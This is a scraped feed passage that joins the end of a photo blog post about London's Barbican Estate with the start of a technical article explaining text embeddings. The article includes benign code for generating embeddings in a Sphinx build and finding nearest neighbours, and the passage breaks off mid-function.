alt="" loading="lazy" width="2000" height="1329" srcset="https://arslan.io/content/images/size/w600/2025/05/L1007985.jpeg 600w, https://arslan.io/content/images/size/w1000/2025/05/L1007985.jpeg 1000w, https://arslan.io/content/images/size/w1600/2025/05/L1007985.jpeg 1600w, https://arslan.io/content/images/2025/05/L1007985.jpeg 2000w" sizes="(min-width: 720px) 720px"></figure><ul><li>There’s an underground parking garage for the residents, but half of it is empty and filled with 20-30-year-old cars whose owners are no longer known.</li></ul><figure><div><p><img src="https://arslan.io/content/images/2025/05/L1007942.jpeg" width="2000" height="1329" loading="lazy" alt="" srcset="https://arslan.io/content/images/size/w600/2025/05/L1007942.jpeg 600w, https://arslan.io/content/images/size/w1000/2025/05/L1007942.jpeg 1000w, https://arslan.io/content/images/size/w1600/2025/05/L1007942.jpeg 1600w, https://arslan.io/content/images/2025/05/L1007942.jpeg 2000w" sizes="(min-width: 720px) 720px"></p><p><img src="https://arslan.io/content/images/2025/05/L1007945.jpeg" width="2000" height="1329" loading="lazy" alt="" srcset="https://arslan.io/content/images/size/w600/2025/05/L1007945.jpeg 600w, https://arslan.io/content/images/size/w1000/2025/05/L1007945.jpeg 1000w, https://arslan.io/content/images/size/w1600/2025/05/L1007945.jpeg 1600w, https://arslan.io/content/images/2025/05/L1007945.jpeg 2000w" sizes="(min-width: 720px) 720px"></p><p><img src="https://arslan.io/content/images/2025/05/L1007926.jpeg" width="2000" height="3012" loading="lazy" alt="" srcset="https://arslan.io/content/images/size/w600/2025/05/L1007926.jpeg 600w, https://arslan.io/content/images/size/w1000/2025/05/L1007926.jpeg 1000w, https://arslan.io/content/images/size/w1600/2025/05/L1007926.jpeg 1600w, https://arslan.io/content/images/2025/05/L1007926.jpeg 2000w" sizes="(min-width: 720px) 720px"></p></div></figure><ul><li>Buildings are named after famous English people lived in their times (i.e: Shakespeare tower)</li></ul><figure><img src="https://arslan.io/content/images/2025/05/L1007968.jpeg" alt="" loading="lazy" width="2000" height="3012" srcset="https://arslan.io/content/images/size/w600/2025/05/L1007968.jpeg 600w, https://arslan.io/content/images/size/w1000/2025/05/L1007968.jpeg 1000w, https://arslan.io/content/images/size/w1600/2025/05/L1007968.jpeg 1600w, https://arslan.io/content/images/2025/05/L1007968.jpeg 2000w" sizes="(min-width: 720px) 720px"></figure><ul><li>The architects were inspired by ancient Egyptians and Battalions. A specific Egyptian Cartouche, resembling a rounded rectangle, is almost universally found.</li></ul><figure><div><p><img src="https://arslan.io/content/images/2025/05/L1007921.jpeg" width="2000" height="1329" loading="lazy" alt="" srcset="https://arslan.io/content/images/size/w600/2025/05/L1007921.jpeg 600w, https://arslan.io/content/images/size/w1000/2025/05/L1007921.jpeg 1000w, https://arslan.io/content/images/size/w1600/2025/05/L1007921.jpeg 1600w, https://arslan.io/content/images/2025/05/L1007921.jpeg 2000w" sizes="(min-width: 720px) 720px"></p><p><img src="https://arslan.io/content/images/2025/05/L1007924.jpeg" width="2000" height="3012" loading="lazy" alt="" srcset="https://arslan.io/content/images/size/w600/2025/05/L1007924.jpeg 600w, https://arslan.io/content/images/size/w1000/2025/05/L1007924.jpeg 1000w, https://arslan.io/content/images/size/w1600/2025/05/L1007924.jpeg 1600w, https://arslan.io/content/images/2025/05/L1007924.jpeg 2000w" sizes="(min-width: 720px) 720px"></p><p><img src="https://arslan.io/content/images/2025/05/L1007916.jpeg" width="2000" height="1329" loading="lazy" alt="" srcset="https://arslan.io/content/images/size/w600/2025/05/L1007916.jpeg 600w, https://arslan.io/content/images/size/w1000/2025/05/L1007916.jpeg 1000w, https://arslan.io/content/images/size/w1600/2025/05/L1007916.jpeg 1600w, https://arslan.io/content/images/2025/05/L1007916.jpeg 2000w" sizes="(min-width: 720px) 720px"></p></div><figcaption><p><span>The rounded cartouche can be seen almost in every detail if you look carefully.</span></p></figcaption></figure><ul><li>There are places that only residents can enter, some of which are completely hidden from the public. The residents have a key fob that can open doors and hidden gateways, allowing them to enter the Barbican even directly from the underground subway.</li></ul><figure><img src="https://arslan.io/content/images/2025/05/L1008032.jpeg" alt="" loading="lazy" width="2000" height="1329" srcset="https://arslan.io/content/images/size/w600/2025/05/L1008032.jpeg 600w, https://arslan.io/content/images/size/w1000/2025/05/L1008032.jpeg 1000w, https://arslan.io/content/images/size/w1600/2025/05/L1008032.jpeg 1600w, https://arslan.io/content/images/2025/05/L1008032.jpeg 2000w" sizes="(min-width: 720px) 720px"></figure><ul><li>The Slow Horses laundry scenes were shot in Barbican.</li></ul><figure><img src="https://arslan.io/content/images/2025/05/L1008015.jpeg" alt="" loading="lazy" width="2000" height="1329" srcset="https://arslan.io/content/images/size/w600/2025/05/L1008015.jpeg 600w, https://arslan.io/content/images/size/w1000/2025/05/L1008015.jpeg 1000w, https://arslan.io/content/images/size/w1600/2025/05/L1008015.jpeg 1600w, https://arslan.io/content/images/2025/05/L1008015.jpeg 2000w" sizes="(min-width: 720px) 720px"><figcaption><span>The Laundry in the Slow Horses TV Show takes place in the Barbican</span></figcaption></figure><ul><li>It was literally built on Roman and the Medieval ruins. </li></ul><figure><img src="https://arslan.io/content/images/2025/05/L1008064-1.jpeg" alt="" loading="lazy" width="2000" height="1329" srcset="https://arslan.io/content/images/size/w600/2025/05/L1008064-1.jpeg 600w, https://arslan.io/content/images/size/w1000/2025/05/L1008064-1.jpeg 1000w, https://arslan.io/content/images/size/w1600/2025/05/L1008064-1.jpeg 1600w, https://arslan.io/content/images/2025/05/L1008064-1.jpeg 2000w" sizes="(min-width: 1200px) 1200px"><figcaption><span>A corner of the Roman city Londonium can be found here. The Roman ruins were heavily modified though in the middle age. So the ruins have layers spanning hundreds of years.</span></figcaption></figure><ul><li>It contains a <em>A 1000 year old Jewish burial ground as well</em>. </li></ul><figure><img src="https://arslan.io/content/images/2025/05/L1008075.jpeg" alt="" loading="lazy" width="2000" height="1329" srcset="https://arslan.io/content/images/size/w600/2025/05/L1008075.jpeg 600w, https://arslan.io/content/images/size/w1000/2025/05/L1008075.jpeg 1000w, https://arslan.io/content/images/size/w1600/2025/05/L1008075.jpeg 1600w, https://arslan.io/content/images/2025/05/L1008075.jpeg 2000w" sizes="(min-width: 720px) 720px"><figcaption><span>Jewish burial ground remains can be seen in the bottom left part.</span></figcaption></figure><ul><li>There is central heating only, residents can't turn them off in the winter, leading to weird states where it gets just too hot or too cold sometimes.</li></ul><figure><img src="https://arslan.io/content/images/2025/05/L1008017.jpeg" alt="" loading="lazy" width="2000" height="1329" srcset="https://arslan.io/content/images/size/w600/2025/05/L1008017.jpeg 600w, https://arslan.io/content/images/size/w1000/2025/05/L1008017.jpeg 1000w, https://arslan.io/content/images/size/w1600/2025/05/L1008017.jpeg 1600w, https://arslan.io/content/images/2025/05/L1008017.jpeg 2000w" sizes="(min-width: 720px) 720px"></figure><ul><li>The residents even have their own online forum sharing news/issues and recommendations between each other: <a href="https://www.barbicantalk.com/forum/?ref=arslan.io" rel="noreferrer">barbicantalk.com</a></li></ul><figure><img src="https://arslan.io/content/images/2025/05/L1008009.jpeg" alt="" loading="lazy" width="2000" height="1329" srcset="https://arslan.io/content/images/size/w600/2025/05/L1008009.jpeg 600w, https://arslan.io/content/images/size/w1000/2025/05/L1008009.jpeg 1000w, https://arslan.io/content/images/size/w1600/2025/05/L1008009.jpeg 1600w, https://arslan.io/content/images/2025/05/L1008009.jpeg 2000w" sizes="(min-width: 720px) 720px"></figure><ul><li>Each building has details that are an ode to certain famous architects and designers, such as Le Corbusier.</li></ul><figure><div><p><img src="https://arslan.io/content/images/2025/05/L1008000.jpeg" width="2000" height="3012" loading="lazy" alt="" srcset="https://arslan.io/content/images/size/w600/2025/05/L1008000.jpeg 600w, https://arslan.io/content/images/size/w1000/2025/05/L1008000.jpeg 1000w, https://arslan.io/content/images/size/w1600/2025/05/L1008000.jpeg 1600w, https://arslan.io/content/images/2025/05/L1008000.jpeg 2000w" sizes="(min-width: 720px) 720px"></p><p><img src="https://arslan.io/content/images/2025/05/L1007983.jpeg" width="2000" height="1329" loading="lazy" alt="" srcset="https://arslan.io/content/images/size/w600/2025/05/L1007983.jpeg 600w, https://arslan.io/content/images/size/w1000/2025/05/L1007983.jpeg 1000w, https://arslan.io/content/images/size/w1600/2025/05/L1007983.jpeg 1600w, https://arslan.io/content/images/2025/05/L1007983.jpeg 2000w" sizes="(min-width: 720px) 720px"></p></div><figcaption><p><span>Look carefully and you see various hints </span></p></figcaption></figure><ul><li>It's popular among media, acrchites and designers. Hence there is always a public photo or video shooting. </li></ul><figure><img src="https://arslan.io/content/images/2025/05/L1007971.jpeg" alt="" loading="lazy" width="2000" height="1329" srcset="https://arslan.io/content/images/size/w600/2025/05/L1007971.jpeg 600w, https://arslan.io/content/images/size/w1000/2025/05/L1007971.jpeg 1000w, https://arslan.io/content/images/size/w1600/2025/05/L1007971.jpeg 1600w, https://arslan.io/content/images/2025/05/L1007971.jpeg 2000w" sizes="(min-width: 720px) 720px"></figure><ul><li>There is a <a href="https://en.wikipedia.org/wiki/Guildhall_School_of_Music_and_Drama?ref=arslan.io" rel="noreferrer">branch of a Music school</a> inside Barbican, and some parts of the building resembling a <a href="https://en.wikipedia.org/wiki/Tuning_fork?ref=arslan.io" rel="noreferrer"><strong>tuning fork</strong></a>.</li></ul><figure><img src="https://arslan.io/content/images/2025/05/L1007903.jpeg" alt="" loading="lazy" width="2000" height="3011" srcset="https://arslan.io/content/images/size/w600/2025/05/L1007903.jpeg 600w, https://arslan.io/content/images/size/w1000/2025/05/L1007903.jpeg 1000w, https://arslan.io/content/images/size/w1600/2025/05/L1007903.jpeg 1600w, https://arslan.io/content/images/2025/05/L1007903.jpeg 2000w" sizes="(min-width: 720px) 720px"></figure><hr><p>Barbican is full of treasures. </p><figure><img src="https://arslan.io/content/images/2025/05/L1008089.jpeg" alt="" loading="lazy" width="2000" height="1329" srcset="https://arslan.io/content/images/size/w600/2025/05/L1008089.jpeg 600w, https://arslan.io/content/images/size/w1000/2025/05/L1008089.jpeg 1000w, https://arslan.io/content/images/size/w1600/2025/05/L1008089.jpeg 1600w, https://arslan.io/content/images/2025/05/L1008089.jpeg 2000w" sizes="(min-width: 720px) 720px"></figure><p>After reading this you might be interested to learn more. Here are a few Book recommendations:</p><ul><li><a href="https://www.amazon.com/Barbican-Residents-Inside-Iconic-Brutalist/dp/1914314832?ref=arslan.io" rel="noreferrer">Barbican Residents</a>: The book is mostly an interior design book, but only from people living in the various apartments in the Barbican Estate. Definitely a must buy if you're interested how the residents live there.</li><li><a href="https://www.amazon.com/Barbican-Estate-Stef-Orazi/dp/1849944571?ref=arslan.io" rel="noreferrer">Barbican Estate</a>: Released in 2019, it's a heavy coffee table book with lots of gorgeous photos about the Barbican</li><li><a href="https://www.amazon.com/Building-Utopia-Barbican-Nicholas-Kenyon/dp/1849946817?ref=arslan.io" rel="noreferrer">Building Utopia: The Barbican Centre</a>: This book was released in 2022, and is currently the most up-to-date book about the Barbican.  It is compiled by Nicholas Kenyon, the Barbican Centre's Managing Director 2007–2021, hence contains a lot of unknown information.</li></ul>
    </div>
                    <div>
                            <p>
                                    Engineer with a passion for Design, Dieter Rams, Watches, Coffee and Bauhaus
                            </p>
                                
                            <p>
                                No spam, no sharing to third party. Only you and me.
                            </p>
                        </div>
</article>
                            

</main>
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Embeddings Are Underrated (429 pts)]]></title>
            <link>https://technicalwriting.dev/ml/embeddings/overview.html</link>
            <guid>43963868</guid>
            <pubDate>Mon, 12 May 2025 15:05:44 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://technicalwriting.dev/ml/embeddings/overview.html">https://technicalwriting.dev/ml/embeddings/overview.html</a>, See on <a href="https://news.ycombinator.com/item?id=43963868">Hacker News</a></p>
<div id="readability-page-1" class="page"><section id="main">
<span id="underrated"></span>
<p>Machine learning (ML) has the potential to advance the state of the
art in technical writing. No, I’m not talking about text generation models
like Claude, Gemini, LLaMa, GPT, etc. The ML technology that might end up
having the biggest impact on technical writing is <strong>embeddings</strong>.</p>
Embeddings aren't exactly new, but they have become much more widely
accessible in the last couple years. What embeddings offer to technical
writers is <b><i>the ability to discover connections between texts at
previously impossible scales</i></b>.<section id="building-intuition-about-embeddings">
<span id="underrated-intuition"></span><h2>Building intuition about embeddings<a href="#building-intuition-about-embeddings" title="Link to this heading">§</a></h2>
<p>Here’s an overview of how you use embeddings and how they work.
It’s geared towards technical writers who are learning about
embeddings for the first time.</p>
<section id="input-and-output">
<span id="underrated-intuition-i-o"></span><h3>Input and output<a href="#input-and-output" title="Link to this heading">§</a></h3>
<p>Someone asks you to “make some embeddings”. What do you input? You input
text.<sup>1</sup> You don’t need to provide the same amount of text every time.
E.g. sometimes your input is a single paragraph while at other times it’s
a few sections, an entire document, or even multiple documents.</p>
<p>What do you get back? If you provide a single word as the
input, the output will be an array of numbers like this:</p>
<div><pre><span></span>[-0.02387, -0.0353, 0.0456]
</pre></div>
<p>Now suppose your input is an entire set of documents. The output
turns into this:</p>
<div><pre><span></span>[0.0451, -0.0154, 0.0020]
</pre></div>
<p>One input was drastically smaller than the other, yet they both produced
an array of 3 numbers. Curiouser and curiouser. (When you work with real embeddings,
the arrays will have hundreds or thousands of numbers, not 3. More on that
later.)</p>
<p>Here’s the first key insight. Because we always get back the same amount of
numbers no matter how big or small the input text, <strong>we now have a way to
mathematically compare any two pieces of arbitrary text to each other</strong>.</p>
<p>But what do those numbers <em>MEAN</em>?</p>
<p><sup>1</sup> Some embedding models are “multimodal”, meaning you can also provide images, videos,
and audio as input. This post focuses on text since that’s the medium that we
work with the most as technical writers.
Haven’t seen a multimodal model support taste, touch, or smell yet!</p>
</section>
<section id="first-how-to-literally-make-the-embeddings">
<span id="underrated-intuition-api"></span><h3>First, how to literally make the embeddings<a href="#first-how-to-literally-make-the-embeddings" title="Link to this heading">§</a></h3>
<p>The big service providers have made it easy.
Here’s how it’s done with Gemini:</p>
<div><pre><span></span><span>import</span><span> </span><span>google.generativeai</span><span> </span><span>as</span><span> </span><span>gemini</span>


<span>gemini</span><span>.</span><span>configure</span><span>(</span><span>api_key</span><span>=</span><span>'…'</span><span>)</span>

<span>text</span> <span>=</span> <span>'Hello, world!'</span>
<span>response</span> <span>=</span> <span>gemini</span><span>.</span><span>embed_content</span><span>(</span>
    <span>model</span><span>=</span><span>'models/text-embedding-004'</span><span>,</span>
    <span>content</span><span>=</span><span>text</span><span>,</span>
    <span>task_type</span><span>=</span><span>'SEMANTIC_SIMILARITY'</span>
<span>)</span>
<span>embedding</span> <span>=</span> <span>response</span><span>[</span><span>'embedding'</span><span>]</span>
</pre></div>
<p>The size of the array depends on what model you’re using. Gemini’s
<a href="https://ai.google.dev/gemini-api/docs/models/gemini#text-embedding">text-embedding-004</a> model returns an array of 768 numbers whereas Voyage AI’s
<a href="https://docs.voyageai.com/docs/embeddings">voyage-3</a> model returns an array of 1024 numbers. This is one of the reasons
why you can’t use embeddings from different providers interchangeably. (The
main reason is that the numbers from one model mean something completely
different than the numbers from another model.)</p>
<section id="does-it-cost-a-lot-of-money">
<h4>Does it cost a lot of money?<a href="#does-it-cost-a-lot-of-money" title="Link to this heading">§</a></h4>
<p>No.</p>
</section>
<section id="is-it-terrible-for-the-environment">
<h4>Is it terrible for the environment?<a href="#is-it-terrible-for-the-environment" title="Link to this heading">§</a></h4>
<p>I don’t know. After the model has been created (trained), I’m pretty sure that
generating embeddings is much less computationally intensive than generating
text. But it also seems to be the case that embedding models are trained in
similar ways as text generation models<sup>2</sup>, with all the energy usage
that implies. I’ll update this section when I find out more.</p>
<p><sup>2</sup> From <a href="https://cybernetist.com/2024/10/21/you-should-probably-pay-attention-to-tokenizers/">You Should Probably Pay Attention to Tokenizers</a>: “Embeddings
are byproduct of transformer training and are actually trained on the heaps of
tokenized texts. It gets better: embeddings are what is actually fed as the
input to LLMs when we ask it to generate text.”</p>
</section>
<section id="what-model-is-best">
<h4>What model is best?<a href="#what-model-is-best" title="Link to this heading">§</a></h4>
<p>Ideally, your embedding model can accept a huge amount of input text,
so that you can generate embeddings for complete pages. If you try to
provide more input than a model can handle, you usually get an error.
As of October 2024 <code><span>voyage-3</span></code> seems to the clear winner in terms of
input size<sup>3</sup>:</p>
<table>
<thead>
<tr><th><p>Organization</p></th>
<th><p>Model name</p></th>
<th><p>Input limit (<a href="https://seantrott.substack.com/p/tokenization-in-large-language-models">tokens</a>)</p></th>
</tr>
</thead>
<tbody>
<tr><td><p>Voyage AI</p></td>
<td><p><a href="https://docs.voyageai.com/docs/embeddings">voyage-3</a></p></td>
<td><p>32000</p></td>
</tr>
<tr><td><p>Nomic</p></td>
<td><p><a href="https://www.nomic.ai/blog/posts/nomic-embed-text-v1">Embed</a></p></td>
<td><p>8192</p></td>
</tr>
<tr><td><p>OpenAI</p></td>
<td><p><a href="https://platform.openai.com/docs/guides/embeddings/#embedding-models">text-embedding-3-large</a></p></td>
<td><p>8191<sup>4</sup></p></td>
</tr>
<tr><td><p>Mistral</p></td>
<td><p><a href="https://docs.mistral.ai/getting-started/models/models_overview/#premier-models">Embed</a></p></td>
<td><p>8000</p></td>
</tr>
<tr><td><p>Google</p></td>
<td><p><a href="https://ai.google.dev/gemini-api/docs/models/gemini#text-embedding">text-embedding-004</a></p></td>
<td><p>2048</p></td>
</tr>
<tr><td><p>Cohere</p></td>
<td><p><a href="https://docs.cohere.com/v2/docs/models#embed">embed-english-v3.0</a></p></td>
<td><p>512</p></td>
</tr>
</tbody>
</table>
<p>For my particular use cases as a technical writer, large input size is an
important factor. However, your use cases may not need large input size, or
there may be other factors that are more important. See the <a href="https://arxiv.org/abs/2210.07316">Massive Text Embedding Benchmark</a>
(MTEB) <a href="https://huggingface.co/spaces/mteb/leaderboard">leaderboard</a>.</p>
<p><sup>3</sup> These input limits are based on <a href="https://seantrott.substack.com/p/tokenization-in-large-language-models">tokens</a>, and each service calculates
tokens differently, so don’t put too much weight into these exact numbers. E.g.
a token for one model may be approximately 3 characters, whereas for another one
it may be approximately 4 characters.</p>
<p><sup>4</sup> Previously, I incorrectly listed this model’s input limit as 3072. Sorry
for the mistake.</p>
</section>
</section>
<section id="very-weird-multi-dimensional-space">
<span id="underrated-intuition-meaning"></span><h3>Very weird multi-dimensional space<a href="#very-weird-multi-dimensional-space" title="Link to this heading">§</a></h3>
<p>Back to the big mystery. What the hell do these numbers <strong>MEAN</strong>?!?!?!</p>
<p>Let’s begin by thinking about <strong>coordinates on a map</strong>.
Suppose I give you three points and their coordinates:</p>
<table>
<thead>
<tr><th><p>Point</p></th>
<th><p>X-Coordinate</p></th>
<th><p>Y-Coordinate</p></th>
</tr>
</thead>
<tbody>
<tr><td><p>A</p></td>
<td><p>3</p></td>
<td><p>2</p></td>
</tr>
<tr><td><p>B</p></td>
<td><p>1</p></td>
<td><p>1</p></td>
</tr>
<tr><td><p>C</p></td>
<td><p>-2</p></td>
<td><p>-2</p></td>
</tr>
</tbody>
</table>
<p>There are 2 dimensions to this map: the X-Coordinate and the
Y-Coordinate. Each point lives at the intersection of an X-Coordinate
and a Y-Coordinate.</p>
<p>Is A closer to B or C?</p>
<figure>
<img alt="../../_images/overview-1.png" src="https://technicalwriting.dev/_images/overview-1.png">
</figure>
<p>A is much closer to B.</p>
<p>Here’s the mental leap. <em>Embeddings are similar to points on a map</em>.
Each number in the embedding array is a <em>dimension</em>, similar to the
X-Coordinates and Y-Coordinates from earlier. When an embedding
model sends you back an array of 1000 numbers, it’s telling you the
point where that text <em>semantically</em> lives in its 1000-dimension space,
relative to all other texts. When we compare the distance between two
embeddings in this 1000-dimension space, what we’re really doing is
<strong>figuring out how semantically close or far apart those two texts are
from each other</strong>.</p>
<figure>
<img alt="../../_images/mindblown.gif" src="https://technicalwriting.dev/_images/mindblown.gif">
</figure>
<p>The concept of positioning items in a multi-dimensional
space like this, where related items are clustered near each other,
goes by the wonderful name of <a href="https://en.wikipedia.org/wiki/Latent_space">latent space</a>.</p>
<p>The most famous example of the weird utility of this technology comes from
the <a href="https://arxiv.org/pdf/1301.3781">Word2vec paper</a>, the foundational research that kickstarted interest
in embeddings 11 years ago. In the paper they shared this anecdote:</p>
<div><pre><span></span>embedding("king") - embedding("man") + embedding("woman") ≈ embedding("queen")
</pre></div>
<p>Starting with the embedding for <code><span>king</span></code>, subtract the embedding for <code><span>man</span></code>,
then add the embedding for <code><span>woman</span></code>. When you look around this vicinity of the
latent space, you find the embedding for <code><span>queen</span></code> nearby. In other words,
embeddings can represent semantic relationships in ways that feel intuitive
to us humans. If you asked a human “what’s the female equivalent
of a king?” that human would probably answer “queen”, the same answer we get from embeddings. For more explanation of the underlying theories, see <a href="https://en.m.wikipedia.org/wiki/Distributional_semantics">Distributional semantics</a>.</p>
<p>The 2D map analogy was a nice stepping stone for building intuition but now we need
to cast it aside, because embeddings operate in hundreds or thousands
of dimensions. It’s impossible for us lowly 3-dimensional creatures to
visualize what “distance” looks like in 1000 dimensions. Also, we don’t know
what each dimension represents, hence the section heading “Very weird
multi-dimensional space”.<sup>5</sup> One dimension might represent something
close to color. The <code><span>king</span> <span>-</span> <span>man</span> <span>+</span> <span>woman</span> <span>≈</span> <span>queen</span></code> anecdote suggests that these
models contain a dimension with some notion of gender. And so on.
<a href="https://youtu.be/7ZYqjaLaK08">Well Dude, we just don’t know</a>.</p>
<p>The mechanics of converting text into very weird multi-dimensional space are
complex, as you might imagine. They are teaching <em>machines</em> to <em>LEARN</em>, after all.
<a href="https://jalammar.github.io/illustrated-word2vec/">The Illustrated Word2vec</a> is a good way to start your journey down that
rabbithole.</p>
<p><sup>5</sup> I borrowed this phrase from <a href="https://simonwillison.net/2023/Oct/23/embeddings/">Embeddings: What they are and why they
matter</a>.</p>
</section>
<section id="comparing-embeddings">
<h3>Comparing embeddings<a href="#comparing-embeddings" title="Link to this heading">§</a></h3>
<p>After you’ve generated your embeddings, you’ll need some kind of “database”
to keep track of what text each embedding is associated to. In the experiment
discussed later, I got by with just a local JSON file:</p>
<div><pre><span></span>{
    "authors": {
        "embedding": […]
    },
    "changes/0.1": {
        "embedding": […]
    },
    …
}
</pre></div>
<p><code><span>authors</span></code> is the name of a page. <code><span>embedding</span></code> is the embedding for that page.</p>
<p>Comparing embeddings involves a lot of linear algebra.
I learned the basics from <a href="https://www.coursera.org/learn/machine-learning-linear-algebra">Linear Algebra for Machine Learning and Data Science</a>.
The big math and ML libraries like <a href="https://numpy.org/doc/stable/">NumPy</a> and <a href="https://scikit-learn.org/stable/">scikit-learn</a> can do the
heavy lifting for you (i.e. very little math code on your end).</p>
</section>
</section>
<section id="applications">
<span id="underrated-applications"></span><h2>Applications<a href="#applications" title="Link to this heading">§</a></h2>
<p>I could tell you exactly how I think we might advance the state of the art
in technical writing with embeddings, but where’s the fun in that?
You now know why they’re such an interesting and useful new tool in the
technical writer toolbox… go connect the rest of the dots yourself!</p>
<p>Let’s cover a basic example to put the intuition-building ideas into
practice and then wrap up this post.</p>

<section id="let-a-thousand-embeddings-bloom">
<h3>Let a thousand embeddings bloom?<a href="#let-a-thousand-embeddings-bloom" title="Link to this heading">§</a></h3>
<p>As docs site owners, I wonder if we should start freely providing embeddings for our
content to anyone who wants them, via REST APIs or <a href="https://en.wikipedia.org/wiki/Well-known_URI">well-known URIs</a>.
Who knows what kinds of cool stuff our communities can build with this extra type
of data about our docs?</p>
</section>
</section>
<section id="parting-words">
<h2>Parting words<a href="#parting-words" title="Link to this heading">§</a></h2>
<p>Three years ago, if you had asked me what 768-dimensional space is,
I would have told you that it’s just some abstract concept that physicists
and mathematicians need for unfathomable reasons, probably something related to
string theory. Embeddings gave me a reason to think about this idea more
deeply, and actually apply it to my own work. I think that’s pretty cool.</p>
<p>Order-of-magnitude improvements in our ability to maintain our docs
may very well still be possible after all… perhaps we just need
an order-of-magnitude-more dimensions!!</p>
</section>
<section id="appendix">
<span id="underrated-appendix"></span><h2>Appendix<a href="#appendix" title="Link to this heading">§</a></h2>
<section id="implementation">
<span id="underrated-appendix-implementation"></span><h3>Implementation<a href="#implementation" title="Link to this heading">§</a></h3>
<p>I created a <a href="https://www.sphinx-doc.org/en/master/development/tutorials/extending_build.html">Sphinx extension</a> to generate an embedding for each doc. Sphinx automatically invokes
this extension as it builds the docs.</p>
<div><pre><span></span><span>import</span><span> </span><span>json</span>
<span>import</span><span> </span><span>os</span>


<span>import</span><span> </span><span>voyageai</span>


<span>VOYAGE_API_KEY</span> <span>=</span> <span>os</span><span>.</span><span>getenv</span><span>(</span><span>'VOYAGE_API_KEY'</span><span>)</span>
<span>voyage</span> <span>=</span> <span>voyageai</span><span>.</span><span>Client</span><span>(</span><span>api_key</span><span>=</span><span>VOYAGE_API_KEY</span><span>)</span>


<span>def</span><span> </span><span>on_build_finished</span><span>(</span><span>app</span><span>,</span> <span>exception</span><span>):</span>
    <span>with</span> <span>open</span><span>(</span><span>srcpath</span><span>,</span> <span>'w'</span><span>)</span> <span>as</span> <span>f</span><span>:</span>
        <span>json</span><span>.</span><span>dump</span><span>(</span><span>data</span><span>,</span> <span>f</span><span>,</span> <span>indent</span><span>=</span><span>4</span><span>)</span>


<span>def</span><span> </span><span>embed_with_voyage</span><span>(</span><span>text</span><span>):</span>
    <span>try</span><span>:</span>
        <span>embedding</span> <span>=</span> <span>voyage</span><span>.</span><span>embed</span><span>([</span><span>text</span><span>],</span> <span>model</span><span>=</span><span>'voyage-3'</span><span>,</span> <span>input_type</span><span>=</span><span>'document'</span><span>)</span><span>.</span><span>embeddings</span><span>[</span><span>0</span><span>]</span>
        <span>return</span> <span>embedding</span>
    <span>except</span> <span>Exception</span> <span>as</span> <span>e</span><span>:</span>
        <span>return</span> <span>None</span>


<span>def</span><span> </span><span>on_doctree_resolved</span><span>(</span><span>app</span><span>,</span> <span>doctree</span><span>,</span> <span>docname</span><span>):</span>
    <span>text</span> <span>=</span> <span>doctree</span><span>.</span><span>astext</span><span>()</span>
    <span>embedding</span> <span>=</span> <span>embed_with_voyage</span><span>(</span><span>text</span><span>)</span>  <span># Generate an embedding for each document!</span>
    <span>data</span><span>[</span><span>docname</span><span>]</span> <span>=</span> <span>{</span>
        <span>'embedding'</span><span>:</span> <span>embedding</span>
    <span>}</span>


<span># Use some globals because this is just an experiment and you can't stop me</span>
<span>def</span><span> </span><span>init_globals</span><span>(</span><span>srcdir</span><span>):</span>
    <span>global</span> <span>filename</span>
    <span>global</span> <span>srcpath</span>
    <span>global</span> <span>data</span>
    <span>filename</span> <span>=</span> <span>'embeddings.json'</span>
    <span>srcpath</span> <span>=</span> <span>f</span><span>'</span><span>{</span><span>srcdir</span><span>}</span><span>/</span><span>{</span><span>filename</span><span>}</span><span>'</span>
    <span>data</span> <span>=</span> <span>{}</span>


<span>def</span><span> </span><span>setup</span><span>(</span><span>app</span><span>):</span>
    <span>init_globals</span><span>(</span><span>app</span><span>.</span><span>srcdir</span><span>)</span>
    <span># https://www.sphinx-doc.org/en/master/extdev/appapi.html#sphinx-core-events</span>
    <span>app</span><span>.</span><span>connect</span><span>(</span><span>'doctree-resolved'</span><span>,</span> <span>on_doctree_resolved</span><span>)</span>  <span># This event fires on every doc that's processed</span>
    <span>app</span><span>.</span><span>connect</span><span>(</span><span>'build-finished'</span><span>,</span> <span>on_build_finished</span><span>)</span>
    <span>return</span> <span>{</span>
        <span>'version'</span><span>:</span> <span>'0.0.1'</span><span>,</span>
        <span>'parallel_read_safe'</span><span>:</span> <span>True</span><span>,</span>
        <span>'parallel_write_safe'</span><span>:</span> <span>True</span><span>,</span>
    <span>}</span>
</pre></div>
<p>When the build finishes, the embeddings data is stored in <code><span>embeddings.json</span></code> like this:</p>
<div><pre><span></span>{
    "authors": {
        "embedding": […]
    },
    "changes/0.1": {
        "embedding": […]
    },
    …
}
</pre></div>
<p><code><span>authors</span></code> and <code><span>changes/0.1</span></code> are docs. <code><span>embedding</span></code> contains the
embedding for that doc.</p>
<p>The last step is to find the closest neighbor for each doc. I.e. to
find the other page that is considered relevant to the page you’re currently on.
As mentioned earlier, <a href="https://www.coursera.org/learn/machine-learning-linear-algebra">Linear Algebra for Machine Learning and Data Science</a>
was the class that taught me the basics.</p>
<div><pre><span></span><span>import</span><span> </span><span>json</span>


<span>import</span><span> </span><span>numpy</span><span> </span><span>as</span><span> </span><span>np</span>
<span>from</span><span> </span><span>sklearn.metrics.pairwise</span><span> </span><span>import</span> <span>cosine_similarity</span>


<span>def</span><span> </span><span>find_docname</span><span>(</span><span>data</span><span>,</span> <span>target</span><span>):</span>
    <span>for</span> <span>docname</span> <span>in</span> <span>data</span><span>:</span>
        <span>if</span> <span>data</span><span>[</span><span>docname</span><span>][</span><span>'embedding'</span><span>]</span> <span>==</span> <span>target</span><span>:</span>
            <span>return</span> <span>docname</span>
    <span>return</span> <span>None</span>


<span># Adapted from the Voyage AI docs</span>
<span># https://web.archive.org/web/20240923001107/https://docs.voyageai.com/docs/quickstart-tutorial</span>
<span>def</span><span> </span><span>k_nearest_neighbors</span><span>(</span><span>target</span><span>,</span> <span>embeddings</span><span>,</span> <span>k</span><span>=</span><span>5</span><span>):</span>
    <span># Convert to numpy array</span>
    <span>target</span> <span>=</span> <span>np</span><span>.</span><span>array</span><span>(</span><span>target</span><span>)</span>
    <span>embeddings</span> <span>=</span> <span>np</span><span>.</span><span>array</span><span>(</span><span>embeddings</span><span>)</span>
    <span># Reshape the query vector embedding to a matrix of shape (1, n) to make it</span>
    <span># compatible with cosine_similarity</span>
    <span>target</span> <span>=</span> <span>target</span><span>.</span><span>reshape</span><span>(</span><span>1</span><span>,</span> <span>-</span><span>1</span><span>)</span>
    <span># Calculate the similarity for each item in data</span>
